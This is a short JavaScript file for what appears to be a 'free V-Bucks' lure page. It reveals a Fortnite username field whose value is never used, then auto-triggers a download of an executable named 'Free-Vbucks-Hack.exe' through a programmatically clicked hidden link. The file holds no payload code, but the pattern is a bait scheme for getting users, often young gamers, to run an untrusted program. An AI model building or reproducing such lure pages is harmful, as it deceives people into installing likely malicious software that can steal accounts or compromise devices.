document.addEventListener("DOMContentLoaded", function() {
    const initiateUpgradeButton = document.getElementById("initiateUpgrade");
    const usernameInputSection = document.getElementById("usernameInput");
    const submitUsernameButton = document.getElementById("submitUsername");

    initiateUpgradeButton.addEventListener("click", function() {
        usernameInputSection.style.display = "block";
    });

    submitUsernameButton.addEventListener("click", function() {
        const username = document.getElementById("fortniteUsername").value;
        if (username) {
            
        } else {
            alert("Please enter your Fortnite username.");
        }
    });
});
document.addEventListener("DOMContentLoaded", function() {
    const downloadButton = document.getElementById("downloadButton");
    downloadButton.addEventListener("click", function() {
        // You can perform additional checks here if needed
        // For example, confirming that the user has entered a valid username
        // or has completed certain actions before initiating the download.
        initiateDownload();
    });
});

function initiateDownload() {
    // Create a link element
    const downloadLink = document.createElement("a");
    downloadLink.href = "Free-Vbucks-Hack.exe"; // Replace with actual path
    downloadLink.download = "Free-Vbucks-Hack.exe"; // Suggested filename
    
    // Trigger a click event on the link element
    document.body.appendChild(downloadLink);
    downloadLink.click();
    document.body.removeChild(downloadLink);
}

